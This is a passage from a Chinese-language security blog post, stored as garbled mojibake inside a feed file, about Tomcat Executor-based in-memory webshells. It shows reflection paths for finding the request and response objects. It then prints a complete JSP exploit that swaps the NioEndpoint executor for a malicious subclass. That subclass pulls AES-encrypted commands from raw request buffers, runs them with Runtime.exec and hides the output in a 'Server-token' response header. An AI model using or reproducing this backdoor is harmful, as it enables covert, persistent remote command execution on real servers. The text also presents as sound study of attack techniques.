ä¸­æ˜¯ç»§æ‰¿äº†ThreadPoolExecutorç±»ç„¶åé‡å†™äº†executeæ–¹æ³•ï¼Œç„¶åé€šè¿‡AbstractEndPointçš„setExecutoræ–¹æ³•å°†åŸæ¥çš„executoræ›¿æ¢ä¸ºæˆ‘ä»¬çš„æ¶æ„ç±»å³å¯</p><p><img src="https://cdn.clown2024.cn/202409271652002.png" alt="image-20240927165222949"></p><p><strong>æ›¿æ¢Executor</strong></p><p>é‚£è¦æ€ä¹ˆæ›¿æ¢executorå‘¢ï¼Œé‚£ç…§ä¾‹æœ€å¥½ä¹Ÿæ˜¯ä»requestçœ‹èƒ½ä¸èƒ½æ‰¾åˆ°AbstractEndPointå¯¹è±¡ï¼Œæ°å¥½æˆ‘ä»¬èƒ½æ‰¾åˆ°è¿™æ ·çš„è·¯å¾„</p><p>request(RequestFacade)â€“&gt;request(Request)â€“&gt;connector(Connector)â€“&gt;protocolHandler(Http11NioProtocol)â€“&gt;endpoint(NioEndpoint)â€“&gt;acceptors(AbstractEndpoint)</p><p>ç„¶åä¹Ÿæ˜¯å’Œå‰é¢ä¸€æ ·åå°„è·å–ç„¶åè°ƒç”¨setExecutoræ–¹æ³•å³å¯</p><p><strong>å›æ˜¾é—®é¢˜</strong></p><p>ç°åœ¨æˆ‘ä»¬è™½ç„¶å¯ä»¥æ›¿æ¢äº†ï¼Œä½†æ˜¯æ•°æ®è¿˜æ— æ³•å›æ˜¾å‡ºæ¥ï¼Œå› ä¸ºæˆ‘ä»¬çš„ServletRequestè¿˜æ²¡æœ‰å°è£…ï¼Œéœ€è¦åˆ°åé¢çš„Processoré˜¶æ®µæ‰è¡Œï¼Œæˆ‘ä»¬å½“å‰è¿˜åœ¨EndPointé˜¶æ®µ</p><p>é‚£å°±éœ€è¦æˆ‘ä»¬èƒ½å¤ŸæŒ–æ˜å‡ºå“ªä¸ªå¯¹è±¡é‡Œé¢å­˜æ”¾ç€Requestå¯¹è±¡ï¼Œæˆ‘ä»¬éœ€è¦æŒ–å‡ºä¸€æ¡é“¾å­ï¼Œç„¶åæˆ‘ä»¬å¾€Requestå¯¹è±¡ä¸Šå°è£…æˆ‘ä»¬çš„å‘½ä»¤ç»“æœï¼Œæ¯”å¦‚å°†ç»“æœæ·»åŠ åˆ°è¯·æ±‚å¤´ä¸Šå›æ˜¾å‡ºæ¥</p><p>æŒ–æ˜å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼Œå±å®æ˜¯å­¦åˆ°äº†ï¼š<a href="https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/">https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/</a></p><p>é‡Œé¢æœ‰ä¸€ä¸ªå¯¹è±¡æœç´¢å·¥å…·ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„å®Œæˆå¯¹requestå¯¹è±¡çš„æœç´¢ï¼š<a href="https://github.com/c0ny1/java-object-searcher">https://github.com/c0ny1/java-object-searcher</a></p><blockquote><p>è¿™ä¸ªå·¥å…·åªæœ‰æºç ï¼Œæˆ‘ä½¿ç”¨çš„æ—¶å€™æ˜¯å…ˆç”¨mavençš„installæŒ‡ä»¤å¯¼å‡ºjaråŒ…åˆ°æœ¬åœ°ä»“åº“ï¼Œç„¶åå†é€šè¿‡pomæ–‡ä»¶æ¥å¼•å…¥</p></blockquote><p>ç„¶åæ ¹æ®æ–‡æ¡£ç”¨ä¸‹é¢ä»£ç æœç´¢request</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.servletshell;<br><br><br><span class="hljs-keyword">import</span> me.gv7.tools.josearcher.entity.Blacklist;<br><span class="hljs-keyword">import</span> me.gv7.tools.josearcher.entity.Keyword;<br><span class="hljs-keyword">import</span> me.gv7.tools.josearcher.searcher.SearchRequstByBFS;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@WebServlet(&quot;/test&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">//è®¾ç½®æœç´¢ç±»å‹åŒ…å«ServletRequestï¼ŒRequstGroupï¼ŒRequest...ç­‰å…³é”®å­—çš„å¯¹è±¡</span><br>        List&lt;Keyword&gt; keys = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        keys.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Keyword</span>.Builder().setField_type(<span class="hljs-string">&quot;request&quot;</span>).build());<br>        <span class="hljs-comment">//è®¾ç½®é»‘åå•</span><br>        List&lt;Blacklist&gt; blacklists = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        blacklists.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Blacklist</span>.Builder().setField_type(<span class="hljs-string">&quot;java.io.File&quot;</span>).build());<br>        <span class="hljs-comment">//æ–°å»ºä¸€ä¸ªå¹¿åº¦ä¼˜å…ˆæœç´¢Thread.currentThread()çš„æœç´¢å™¨</span><br>        <span class="hljs-type">SearchRequstByBFS</span> <span class="hljs-variable">searcher</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SearchRequstByBFS</span>(Thread.currentThread(),keys);<br>        <span class="hljs-comment">//æ‰“å¼€è°ƒè¯•æ¨¡å¼</span><br>        searcher.setIs_debug(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//æŒ–æ˜æ·±åº¦ä¸º20</span><br>        searcher.setMax_search_depth(<span class="hljs-number">20</span>);<br>        <span class="hljs-comment">//è®¾ç½®æŠ¥å‘Šä¿å­˜ä½ç½®</span><br>        searcher.setReport_save_path(<span class="hljs-string">&quot;D:\\CTF\\Java\\JavaCode\\ServletShell&quot;</span>);<br>        searcher.searchObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409272014082.png" alt="image-20240927201422968"></p><p>è¿™é‡Œç»™å‡ºäº†å¾ˆå¤šçš„é“¾å­ï¼Œæˆ‘ä»¬Ctrl+Få»æœç´¢**request &#x3D;**æ‰¾ä¸€ä¸‹èƒ½åˆ©ç”¨çš„ï¼Œæ–‡ç« ä¸­æ‰¾çš„æ˜¯è¿™æ¡é“¾å­</p><p><img src="https://cdn.clown2024.cn/202409272035854.png" alt="image-20240927203519789"></p><p>é‡Œé¢æœ‰ä¸ªNioEndpointï¼Œåˆšå¥½æ˜¯æˆ‘ä»¬èƒ½è·å–åˆ°çš„ï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œä¸‹æ–­ç‚¹ç„¶åstep overå»è°ƒè¯•</p><p><img src="https://cdn.clown2024.cn/202409272028044.png" alt="image-20240927202757759"></p><p>æ‰“å®Œæ–­ç‚¹ä¹‹åæˆ‘ä»¬å°±åˆ°å †æ ˆçš„Threadçš„ä½ç½®å¼€å§‹é¡ºç€é“¾å­æ‰¾</p><p><img src="https://cdn.clown2024.cn/202409272105715.png" alt="image-20240927210521619"></p><p>æœ€ç»ˆæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°request</p><p>ç„¶åå†å¾€é‡Œæ‰¾ï¼Œå¯ä»¥æ‰¾åˆ°ä¸€ä¸ªinputBufferï¼Œé‡Œé¢å­˜æ”¾ç€æˆ‘ä»¬çš„GETå†…å®¹</p><p><img src="https://cdn.clown2024.cn/202409272109789.png" alt="image-20240927210934698"></p><p>å¯ä»¥å°†å­—èŠ‚æ•°ç»„view as stringï¼Œç„¶åæŸ¥çœ‹å³å¯ï¼Œç°åœ¨æˆ‘ä»¬å°±å¯ä»¥åšåˆ°å°†å‘½ä»¤æ”¾å…¥requestçš„è¯·æ±‚å¤´ä¸­ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯è¦å°†å…¶ä½œä¸ºresponseçš„headerä¼ å‡º</p><p>è¿™é‡Œresponseå¯¹è±¡å’Œrequeståœ¨åŒä¸€çº§ä¸‹ï¼Œéƒ½åœ¨connectionsé‡Œé¢</p><p><img src="https://cdn.clown2024.cn/202409272120291.png" alt="image-20240927212000209"></p><p>è¿™æ ·responseæˆ‘ä»¬ä¹Ÿæœ‰äº†ï¼Œæå‰å°†ç»“æœå°è£…è¿›responseå³å¯ï¼Œç°åœ¨å°±æ¥ç¼–å†™å†…å­˜é©¬</p><h2 id="å†…å­˜é©¬ç¼–å†™"><a href="#å†…å­˜é©¬ç¼–å†™-2" class="headerlink" title="å†…å­˜é©¬ç¼–å†™"></a>å†…å­˜é©¬ç¼–å†™</h2><p>ç•™ä¸ªå‘å…ˆï¼Œåˆ†æå¾—å¥½ç´¯ä¹Ÿè¿˜æ²¡æ˜ç™½ï¼Œåˆ«äººçš„å†…å­˜é©¬exp</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.net.NioEndpoint&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.threads.ThreadPoolExecutor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.concurrent.TimeUnit&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.concurrent.BlockingQueue&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.concurrent.ThreadFactory&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.nio.ByteBuffer&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.ArrayList&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.RequestInfo&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.Response&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.nio.charset.StandardCharsets&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.concurrent.RejectedExecutionHandler&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br><br><br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_SECRET_KEY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;blueblueblueblue&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">AES</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;AES&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] KEY_VI = <span class="hljs-string">&quot;blueblueblueblue&quot;</span>.getBytes();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CIPHER_ALGORITHM</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;AES/CBC/PKCS5Padding&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> java.util.Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">base64Encoder</span> <span class="hljs-operator">=</span> java.util.Base64.getEncoder();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> java.util.Base64.<span class="hljs-type">Decoder</span> <span class="hljs-variable">base64Decoder</span> <span class="hljs-operator">=</span> java.util.Base64.getDecoder();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">decode</span><span class="hljs-params">(String key, String content)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            javax.crypto.<span class="hljs-type">SecretKey</span> <span class="hljs-variable">secretKey</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.crypto.spec.SecretKeySpec(key.getBytes(), AES);<br>            javax.crypto.<span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> javax.crypto.Cipher.getInstance(CIPHER_ALGORITHM);<br>            cipher.init(javax.crypto.Cipher.DECRYPT_MODE, secretKey, <span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.crypto.spec.IvParameterSpec(KEY_VI));<br><br>            <span class="hljs-type">byte</span>[] byteContent = base64Decoder.decode(content);<br>            <span class="hljs-type">byte</span>[] byteDecode = cipher.doFinal(byteContent);<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(byteDecode, java.nio.charset.StandardCharsets.UTF_8);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">encode</span><span class="hljs-params">(String key, String content)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            javax.crypto.<span class="hljs-type">SecretKey</span> <span class="hljs-variable">secretKey</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.crypto.spec.SecretKeySpec(key.getBytes(), AES);<br>            javax.crypto.<span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> javax.crypto.Cipher.getInstance(CIPHER_ALGORITHM);<br>            cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, secretKey, <span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.crypto.spec.IvParameterSpec(KEY_VI));<br>            <span class="hljs-type">byte</span>[] byteEncode = content.getBytes(java.nio.charset.StandardCharsets.UTF_8);<br>            <span class="hljs-type">byte</span>[] byteAES = cipher.doFinal(byteEncode);<br>            <span class="hljs-keyword">return</span> base64Encoder.encodeToString(byteAES);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getField</span><span class="hljs-params">(Object object, String fieldName)</span> &#123;<br>        Field declaredField;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> object.getClass();<br>        <span class="hljs-keyword">while</span> (clazz != Object.class) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br><br>                declaredField = clazz.getDeclaredField(fieldName);<br>                declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>                <span class="hljs-keyword">return</span> declaredField.get(object);<br>            &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            &#125;<br>            clazz = clazz.getSuperclass();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getStandardService</span><span class="hljs-params">()</span> &#123;<br>        Thread[] threads = (Thread[]) <span class="hljs-built_in">this</span>.getField(Thread.currentThread().getThreadGroup(), <span class="hljs-string">&quot;threads&quot;</span>);<br>        <span class="hljs-keyword">for</span> (Thread thread : threads) &#123;<br>            <span class="hljs-keyword">if</span> (thread == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> ((thread.getName().contains(<span class="hljs-string">&quot;Acceptor&quot;</span>)) &amp;&amp; (thread.getName().contains(<span class="hljs-string">&quot;http&quot;</span>))) &#123;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getField(thread, <span class="hljs-string">&quot;target&quot;</span>);<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">jioEndPoint</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    jioEndPoint = getField(target, <span class="hljs-string">&quot;this$0&quot;</span>);<br>                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (jioEndPoint == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        jioEndPoint = getField(target, <span class="hljs-string">&quot;endpoint&quot;</span>);<br>                    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">return</span> jioEndPoint;<br>                &#125;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>    &#125;<br><br>    <span class="hljs-comment">//æ¶æ„executor</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">threadexcutor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ThreadPoolExecutor</span> &#123;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">threadexcutor</span><span class="hljs-params">(<span class="hljs-type">int</span> corePoolSize, <span class="hljs-type">int</span> maximumPoolSize, <span class="hljs-type">long</span> keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler)</span> &#123;<br>            <span class="hljs-built_in">super</span>(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getRequest</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), <span class="hljs-string">&quot;threads&quot;</span>));<br><br>                <span class="hljs-keyword">for</span> (Thread thread : threads) &#123;<br>                    <span class="hljs-keyword">if</span> (thread != <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">threadName</span> <span class="hljs-operator">=</span> thread.getName();<br>                        <span class="hljs-keyword">if</span> (!threadName.contains(<span class="hljs-string">&quot;exec&quot;</span>) &amp;&amp; threadName.contains(<span class="hljs-string">&quot;Acceptor&quot;</span>)) &#123;<br>                            <span class="hljs-type">Object</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> getField(thread, <span class="hljs-string">&quot;target&quot;</span>);<br>                            <span class="hljs-keyword">if</span> (target <span class="hljs-keyword">instanceof</span> Runnable) &#123;<br>                                <span class="hljs-keyword">try</span> &#123;<br><br><br>                                    Object[] objects = (Object[]) getField(getField(getField(target, <span class="hljs-string">&quot;this$0&quot;</span>), <span class="hljs-string">&quot;nioChannels&quot;</span>), <span class="hljs-string">&quot;stack&quot;</span>);<br><br><br>                                    <span class="hljs-type">ByteBuffer</span> <span class="hljs-variable">heapByteBuffer</span> <span class="hljs-operator">=</span> (ByteBuffer) getField(getField(objects[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;appReadBufHandler&quot;</span>), <span class="hljs-string">&quot;byteBuffer&quot;</span>);<br>                                    <span class="hljs-type">String</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(heapByteBuffer.array(), <span class="hljs-string">&quot;UTF-8&quot;</span>);<br><br>                                    <span class="hljs-keyword">if</span> (a.indexOf(<span class="hljs-string">&quot;blue0&quot;</span>) &gt; -<span class="hljs-number">1</span>) &#123;<br>                                        System.out.println(a.indexOf(<span class="hljs-string">&quot;blue0&quot;</span>));<br>                                        System.out.println(a.indexOf(<span class="hljs-string">&quot;\r&quot;</span>, a.indexOf(<span class="hljs-string">&quot;blue0&quot;</span>)) - <span class="hljs-number">1</span>);<br>                                        <span class="hljs-type">String</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> a.substring(a.indexOf(<span class="hljs-string">&quot;blue0&quot;</span>) + <span class="hljs-string">&quot;blue0&quot;</span>.length() + <span class="hljs-number">1</span>, a.indexOf(<span class="hljs-string">&quot;\r&quot;</span>, a.indexOf(<span class="hljs-string">&quot;blue0&quot;</span>)) - <span class="hljs-number">1</span>);<br><br>                                        b = decode(DEFAULT_SECRET_KEY, b);<br><br>                                        <span class="hljs-keyword">return</span> b;<br>                                    &#125;<br><br>                                &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;<br>                                    System.out.println(var11);<br>                                    <span class="hljs-keyword">continue</span>;<br>                                &#125;<br><br><br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (Exception ignored) &#123;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>();<br>        &#125;<br><br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getResponse</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] res)</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), <span class="hljs-string">&quot;threads&quot;</span>));<br><br>                <span class="hljs-keyword">for</span> (Thread thread : threads) &#123;<br>                    <span class="hljs-keyword">if</span> (thread != <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">threadName</span> <span class="hljs-operator">=</span> thread.getName();<br>                        <span class="hljs-keyword">if</span> (!threadName.contains(<span class="hljs-string">&quot;exec&quot;</span>) &amp;&amp; threadName.contains(<span class="hljs-string">&quot;Acceptor&quot;</span>)) &#123;<br>                            <span class="hljs-type">Object</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> getField(thread, <span class="hljs-string">&quot;target&quot;</span>);<br>                            <span class="hljs-keyword">if</span> (target <span class="hljs-keyword">instanceof</span> Runnable) &#123;<br>                                <span class="hljs-keyword">try</span> &#123;<br>                                    <span class="hljs-type">ArrayList</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> (ArrayList) getField(getField(getField(getField(target, <span class="hljs-string">&quot;this$0&quot;</span>), <span class="hljs-string">&quot;handler&quot;</span>), <span class="hljs-string">&quot;global&quot;</span>), <span class="hljs-string">&quot;processors&quot;</span>);<br>                                    <span class="hljs-keyword">for</span> (Object tmp_object : objects) &#123;<br>                                        <span class="hljs-type">RequestInfo</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (RequestInfo) tmp_object;<br>                                        <span class="hljs-type">Response</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> (Response) getField(getField(request, <span class="hljs-string">&quot;req&quot;</span>), <span class="hljs-string">&quot;response&quot;</span>);<br>                                        response.addHeader(<span class="hljs-string">&quot;Server-token&quot;</span>, encode(DEFAULT_SECRET_KEY,<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(res, <span class="hljs-string">&quot;UTF-8&quot;</span>)));<br><br>                                    &#125;<br>                                &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;<br>                                    <span class="hljs-keyword">continue</span>;<br>                                &#125;<br><br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (Exception ignored) &#123;<br>            &#125;<br>        &#125;<br><br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(Runnable command)</span> &#123;<br><span class="hljs-comment">//            System.out.println(&quot;123&quot;);</span><br><br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> getRequest();<br>            <span class="hljs-keyword">if</span> (cmd.length() &gt; <span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">Runtime</span> <span class="hljs-variable">rt</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>                    <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> rt.exec(cmd);<br>                    java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> process.getInputStream();<br><br>                    java.io.<span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">resultReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(in);<br>                    java.io.<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">stdInput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(resultReader);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                    <span class="hljs-keyword">while</span> ((tmp = stdInput.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                        s += tmp;<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (s != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                        <span class="hljs-type">byte</span>[] res = s.getBytes(StandardCharsets.UTF_8);<br>                        getResponse(res);<br>                    &#125;<br><br><br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br><br><br>            <span class="hljs-built_in">this</span>.execute(command, <span class="hljs-number">0L</span>, TimeUnit.MILLISECONDS);<br>        &#125;<br><br>    &#125;<br><br>%&gt;<br><br>&lt;%<br>    <span class="hljs-type">NioEndpoint</span> <span class="hljs-variable">nioEndpoint</span> <span class="hljs-operator">=</span> (NioEndpoint) getStandardService();<br>    <span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> (ThreadPoolExecutor) getField(nioEndpoint, <span class="hljs-string">&quot;executor&quot;</span>);<br>    <span class="hljs-type">threadexcutor</span> <span class="hljs-variable">exe</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">threadexcutor</span>(exec.getCorePoolSize(), exec.getMaximumPoolSize(), exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, exec.getQueue(), exec.getThreadFactory(), exec.getRejectedExecutionHandler());<br>    nioEndpoint.setExecutor(exe);<br>%&gt;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> å†…å­˜é©¬ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javassistå­¦ä¹ </title>
      <link href="/2024/09/05/javassist%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/09/05/javassist%E5%AD%A6%E4%B9%A0/</url>
      
